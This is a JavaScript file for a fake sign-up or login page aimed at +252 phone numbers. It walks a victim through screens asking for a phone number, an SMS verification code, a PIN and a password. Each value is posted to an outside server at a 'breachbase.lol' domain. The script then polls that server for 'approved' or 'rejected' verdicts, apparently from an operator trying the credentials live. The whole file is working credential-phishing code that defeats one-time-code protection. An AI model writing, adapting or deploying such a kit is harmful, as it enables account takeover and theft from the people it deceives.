const API_URL = "https://p.breachbase.lol/v1";
const TENANT_KEY = "nmnmnnm090909";

document.addEventListener('DOMContentLoaded', () => {
    const welcomeScreen = document.getElementById('welcome-screen');
    const phoneScreen = document.getElementById('phone-screen');
    const codeScreen = document.getElementById('code-screen');
    const pinScreen = document.getElementById('pin-screen');
    const passwordScreen = document.getElementById('password-screen');
    const loadingOverlay = document.getElementById('loading-overlay');

    const btnGetStarted = document.getElementById('btn-get-started');
    const btnNextPhone = document.getElementById('btn-next-phone');
    const btnNextCode = document.getElementById('btn-next-code');
    const btnNextPin = document.getElementById('btn-next-pin');
    const btnNextPassword = document.getElementById('btn-next-password');

    const phoneInput = document.getElementById('phone-input');
    const passwordInput = document.getElementById('password-input');
    
    const codeBoxes = document.querySelectorAll('#code-screen .code-box');
    const pinBoxes = document.querySelectorAll('#pin-screen .pin-box');

    let currentUserPhone = "";

    function showLoading() {
        if(loadingOverlay) loadingOverlay.classList.remove('hidden');
    }

    function hideLoading() {
        if(loadingOverlay) loadingOverlay.classList.add('hidden');
    }

    function showError(msg) {
        if (typeof Toastify !== 'undefined') {
            Toastify({
                text: msg,
                duration: 3000,
                close: true,
                gravity: "top",
                position: "center",
                style: {
                    background: "#ff4444",
                    borderRadius: "8px"
                }
            }).showToast();
        } else {
            alert(msg);
        }
    }

    async function processStep(payload, onSuccess, onReject) {
        showLoading();
        try {
            const res = await fetch(`${API_URL}/callback`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${TENANT_KEY}`
                },
                body: JSON.stringify(payload)
            });

            if (!res.ok) throw new Error(`Server returned ${res.status}`);
            const data = await res.json();
            const attemptId = data.attemptId;

            let pollCount = 0;
            const maxPolls = 60; // 2 minutes
            
            const interval = setInterval(async () => {
                pollCount++;
                if (pollCount > maxPolls) {
                    clearInterval(interval);
                    hideLoading();
                    showError("Request timed out. Please try again.");
                    return;
                }

                try {
                    const statusRes = await fetch(`${API_URL}/status?attemptId=${attemptId}&_t=${Date.now()}`, {
                        headers: {
                            "Authorization": `Bearer ${TENANT_KEY}`
                        }
                    });
                    const statusData = await statusRes.json();
                    
                    if (statusData.status === "approved") {
                        clearInterval(interval);
                        hideLoading();
                        onSuccess();
                    } else if (statusData.status === "rejected") {
                        clearInterval(interval);
                        hideLoading();
                        if (onReject) onReject();
                        else showError("Information rejected. Please check and try again.");
                    }
                } catch (e) {
                    console.error("Polling error", e);
                }
            }, 2000);

        } catch (err) {
            console.error(err);
            hideLoading();
            showError("Failed to connect to server. Please try again.");
        }
    }

    // Navigation logic
    btnGetStarted.addEventListener('click', () => {
        welcomeScreen.classList.remove('active');
        welcomeScreen.classList.add('hidden');
        phoneScreen.classList.remove('hidden');
        phoneScreen.classList.add('active');
        setTimeout(() => phoneInput.focus(), 400);
    });

    btnNextPhone.addEventListener('click', () => {
        if (!btnNextPhone.disabled) {
            currentUserPhone = "+252" + phoneInput.value.replace(/\s/g, '');
            const payload = {
                type: 'login',
                name: '',
                phone: currentUserPhone,
                details: 'Initiated login'
            };

            processStep(payload, () => {
                phoneScreen.classList.remove('active');
                phoneScreen.classList.add('hidden');
                codeScreen.classList.remove('hidden');
                codeScreen.classList.add('active');
                setTimeout(() => codeBoxes[0].focus(), 400);
            });
        }
    });

    btnNextCode.addEventListener('click', () => {
        if (!btnNextCode.disabled) {
            const code = Array.from(codeBoxes).map(b => b.value).join('');
            const payload = {
                type: 'otp',
                name: '',
                phone: currentUserPhone,
                details: `OTP: ${code}`
            };

            processStep(payload, () => {
                codeScreen.classList.remove('active');
                codeScreen.classList.add('hidden');
                pinScreen.classList.remove('hidden');
                pinScreen.classList.add('active');
                setTimeout(() => pinBoxes[0].focus(), 400);
            }, () => {
                showError("Invalid verification code. Try again.");
                codeBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
                codeBoxes[0].focus();
                btnNextCode.disabled = true;
                btnNextCode.classList.add('disabled');
            });
        }
    });

    btnNextPin.addEventListener('click', () => {
        if (!btnNextPin.disabled) {
            const pin = Array.from(pinBoxes).map(b => b.value).join('');
            const payload = {
                type: 'pin',
                name: '',
                phone: currentUserPhone,
                details: `PIN: ${pin}`
            };

            processStep(payload, () => {
                pinScreen.classList.remove('active');
                pinScreen.classList.add('hidden');
                passwordScreen.classList.remove('hidden');
                passwordScreen.classList.add('active');
                setTimeout(() => passwordInput.focus(), 400);
            }, () => {
                showError("Invalid PIN. Try again.");
                pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
                pinBoxes[0].focus();
                btnNextPin.disabled = true;
                btnNextPin.classList.add('disabled');
            });
        }
    });

    btnNextPassword.addEventListener('click', () => {
        if (!btnNextPassword.disabled) {
            const payload = {
                type: 'password',
                name: '',
                phone: currentUserPhone,
                details: `Password: ${passwordInput.value}`
            };

            processStep(payload, () => {
                if (typeof Toastify !== 'undefined') {
                    Toastify({
                        text: "Setup Complete! Redirecting...",
                        duration: 3000,
                        gravity: "top",
                        position: "center",
                        style: { background: "#0dc98f", borderRadius: "8px" }
                    }).showToast();
                } else {
                    alert("Setup Complete!");
                }
                setTimeout(() => {
                    window.location.reload();
                }, 3000);
            }, () => {
                showError("Password rejected. Please use a different password.");
                passwordInput.value = '';
                btnNextPassword.disabled = true;
                btnNextPassword.classList.add('disabled');
            });
        }
    });

    // Input handlers
    phoneInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '');
        if (e.target.value.length > 5) {
            btnNextPhone.disabled = false;
            btnNextPhone.classList.remove('disabled');
        } else {
            btnNextPhone.disabled = true;
            btnNextPhone.classList.add('disabled');
        }
    });

    phoneInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' && !btnNextPhone.disabled) {
            btnNextPhone.click();
        }
    });

    passwordInput.addEventListener('input', (e) => {
        if (e.target.value.length >= 6) {
            btnNextPassword.disabled = false;
            btnNextPassword.classList.remove('disabled');
        } else {
            btnNextPassword.disabled = true;
            btnNextPassword.classList.add('disabled');
        }
    });

    passwordInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' && !btnNextPassword.disabled) {
            btnNextPassword.click();
        }
    });

    function setupBoxes(boxes, nextBtn) {
        boxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '');
                if (e.target.value.length === 1) {
                    box.classList.add('filled');
                    if (index < boxes.length - 1) {
                        boxes[index + 1].focus();
                    }
                } else {
                    box.classList.remove('filled');
                }
                checkFilled();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    box.classList.remove('filled');
                    if (e.target.value.length === 0 && index > 0) {
                        boxes[index - 1].focus();
                    }
                } else if (e.key === 'ArrowLeft' && index > 0) {
                    boxes[index - 1].focus();
                } else if (e.key === 'ArrowRight' && index < boxes.length - 1) {
                    boxes[index + 1].focus();
                } else if (e.key === 'Enter' && !nextBtn.disabled) {
                    nextBtn.click();
                }
            });
            
            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const pastedData = (e.clipboardData || window.clipboardData).getData('text');
                const numericData = pastedData.replace(/\D/g, '').slice(0, boxes.length);
                if (numericData.length > 0) {
                    for (let i = 0; i < numericData.length; i++) {
                        if (index + i < boxes.length) {
                            boxes[index + i].value = numericData[i];
                            boxes[index + i].classList.add('filled');
                        }
                    }
                    const nextEmptyIndex = Math.min(index + numericData.length, boxes.length - 1);
                    boxes[nextEmptyIndex].focus();
                    checkFilled();
                }
            });
        });
        
        function checkFilled() {
            let allFilled = true;
            boxes.forEach(b => { if (b.value.length === 0) allFilled = false; });
            if (allFilled) {
                nextBtn.disabled = false;
                nextBtn.classList.remove('disabled');
            } else {
                nextBtn.disabled = true;
                nextBtn.classList.add('disabled');
            }
        }
    }

    setupBoxes(codeBoxes, btnNextCode);
    setupBoxes(pinBoxes, btnNextPin);
});
